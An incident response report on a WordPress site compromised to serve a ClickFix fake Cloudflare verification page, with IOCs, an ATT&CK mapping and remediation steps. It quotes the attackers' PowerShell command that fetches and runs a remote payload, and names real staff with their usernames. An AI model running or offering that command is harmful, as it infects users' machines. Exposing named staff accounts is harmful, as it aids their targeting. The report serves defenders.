## Incident Response Report – Breakers FWB Website Compromise
*7 Sept 2025, K. Tonkin & R. Halim*

## Executive Summary
On September 5, 2025, the Breakers FWB website (```https://www.breakersfwb.com```) was found to be compromised and actively serving a ClickFix-style social engineering campaign. Malicious JavaScript was injected into the site, overlaying a fake Cloudflare “verification” page hosted on ```ncloud.icu``` via a dynamically loaded <iframe>. This page mimicked legitimate security checks but was designed to exploit users’ instinct to “fix” perceived issues—hallmarks of the ClickFix technique.

The fraudulent overlay instructed users to press Win+R and Ctrl+V to paste a PowerShell command copied to their clipboard: ```powershell -w h -nop -c iex(iwr -Uri 155[.]94[.]155[.]25 -UseBasicParsing)``` This command downloaded additional payloads from ```155.94.155.25```, consistent with ClickFix campaigns that rely on human interaction to bypass automated defenses

Investigation showed evidence of:
- Server-side injection of obfuscated JavaScript redirectors.
- External calls to malicious domains (getfix.win, ncloud.icu).
- Exposure of WordPress user accounts (admin, ethanwhited, barbara).
- SEO spam posts created Sept 3–4, 2025, unrelated to Breakers’ business.

The compromise likely originated from vulnerable WordPress plugins or weak credentials, and the site was repurposed as a malware distribution platform.ntials.

---

## Indicators of Compromise (IOCs)

| Type      | Value / Indicator                                                                 | Notes |
|-----------|------------------------------------------------------------------------------------|-------|
| Domain    | `getfix.win`                                                                      | Primary malicious script delivery |
| Domain    | `ncloud.icu`                                                                      | Iframe redirector domain |
| Domain    | `2no.co`                                                                          | Used in injected iframe chain |
| IP        | `155.94.155.25`                                                                   | PowerShell download host |
| Path      | `/wp-json/wp/v2/users`                                                            | Publicly exposes WordPress user list |
| Script    | Malicious `<script>` block in `<body>` calling `getfix.win/jsrepo?...`             | Injected server-side |
| Spam URLs | `/island-blog/casino-site-payment-methods-in-canada...` (and similar gambling posts)| Created Sept 3–5, 2025 |

---

## MITRE ATT&CK Mapping

| ATT&CK Tactic      | Technique ID | Technique Name                                | Observed Example |
|--------------------|--------------|-----------------------------------------------|------------------|
| Initial Access     | T1190        | Exploit Public-Facing Application             | Likely WordPress plugin exploit (Photo Gallery, Gravity Forms, Streamline Core) |
| Execution          | T1059.001    | Command and Scripting Interpreter: PowerShell | Fake Cloudflare page copied malicious command to clipboard |
| Persistence        | T1078        | Valid Accounts                                | WordPress users ```admin```, ```ethanwhited```, ```barbara```, possibly others |
| Defense Evasion    | T1027        | Obfuscated Files or Information               | Obfuscated injected JavaScript (```_0x32f8cc```, ```cxhrz``` loops) |
| Credential Access  | T1110        | Brute Force                                   | Risk to exposed ```admin``` account |
| Impact             | T1499        | Endpoint Denial of Service                    | Browser crashpad / spawned processes observed in sandbox |

---

## Compromised / Suspicious User Accounts

During investigation, several WordPress accounts were discovered that appear linked to real Breakers staff as well as a visible administrator account. This dramatically increases risk, since attackers leveraging these accounts could blend in with normal operations.

| User ID | Username       | Observations                                                                 |
|---------|----------------|-------------------------------------------------------------------------------|
| 1       | ```admin```        | Default WordPress admin, publicly exposed via ```/wp-json/wp/v2/users```. Target for brute force. Should be disabled. |
| 8       | ```barbara```      | Barbara Martens, listed on LinkedIn as General Manager at The Breakers. Active author profile at ```/island-blog/author/barbara/```. A high-privilege staff account, very likely targeted or compromised. |
| 12      | ```ethanwhited```  | Ethan Whited, listed on LinkedIn as Rental Manager at The Breakers. Legitimate staff identity, may have been abused to publish content or perform admin actions. |

### Risks
- Credential compromise: Attackers may have obtained staff credentials via phishing, reuse, or brute-force.  
- Abuse of legitimacy: Posts created under real employee names or administrators look legitimate to visitors.  
- Persistence: Even if malicious code is cleaned, attackers could return using valid staff logins.  

### Recommended Actions
1. Immediately reset passwords for all WordPress accounts (staff + admin).  
2. Audit user activity (login IPs, post creation, plugin changes) for ```admin```, ```barbara```, and ```ethanwhited```.  
3. Disable the default ```admin``` account permanently.  
4. Require 2FA for staff (Barbara, Ethan, etc).  
5. Review if staff email accounts (O365/Gmail) show signs of compromise. If email accounts exist on a personal device, verifiy integrity of personal accounts as well.

---

## Root Cause Analysis
- Entry vector is not fully confirmed.  
- Most probable: exploitation of a vulnerable plugin (Photo Gallery, Gravity Forms, or Streamline Core).  
- Once access was gained, attackers injected malicious JavaScript into theme/plugin files or database options.  
- Attackers also published SEO spam posts to increase persistence and site abuse value.  
- Exposed ```/wp-json``` API revealed usernames, increasing brute force risk.  

---

## Recommended Actions

### Immediate Containment
- Take site offline or place in maintenance mode.  
- Block IOCs (```getfix.win```, ```ncloud.icu```, ```2no.co```, ```155.94.155.25```) at firewall, DNS, and WAF.  
- Export WordPress database and filesystem for forensic preservation.  

### Eradication
- Search and remove injected ```<script>``` calls (especially ```getfix.win``` and ```ncloud.icu```) in:
  - Theme files ( such as ```header.php```, ```footer.php```, ```functions.php```, and more)  
  - WordPress options table (```wp_options``` → ```siteurl```, ```home```, or injected widgets)  
- Delete all spam posts/pages.  
- Remove or disable the ```admin``` account. Confirm no hidden users exist.  
- Restore from a pre-Sept 2, 2025 backup if possible.  
- Update WordPress core and all plugins.  

### Recovery & Hardening
- Reset all credentials (WP Admins, hosting panel, SFTP, SSH, database).  
- Restrict uploads: disallow ```.php``` execution in ```wp-content/uploads/```.  
- Enforce a strict Content-Security-Policy (CSP) to block unauthorized scripts.  
- Enable WAF / IDS (WP Engine + Cloudflare).  
- Monitor WordPress logs (Stream plugin, server access logs) for suspicious logins.  
- Enable 2FA for all user accounts.  

---

## Conclusion
This incident reflects a textbook implementation of the ClickFix social engineering technique. The attackers exploited Breakers FWB’s WordPress vulnerabilities to inject malicious scripts and launch a deceptive “verification” overlay. This overlay mimicked legitimate services and instructed users to run clipboard-injected PowerShell commands—an approach designed to bypass automated defenses by relying on human interaction1.

The site was not merely defaced—it was weaponized as a malware distribution hub. Remediation must include full restoration, credential resets, and hardening against reinfection. Ongoing monitoring and user education are critical to prevent future ClickFix-style attacks.not fully remediated.

---

## References
https://www.microsoft.com/en-us/security/blog/2025/08/21/think-before-you-clickfix-analyzing-the-clickfix-social-engineering-technique/

https://www.fortinet.com/blog/threat-research/clickfix-to-command-a-full-powershell-attack-chain

https://www.hhs.gov/sites/default/files/clickfix-attacks-sector-alert-tlpclear.pdf

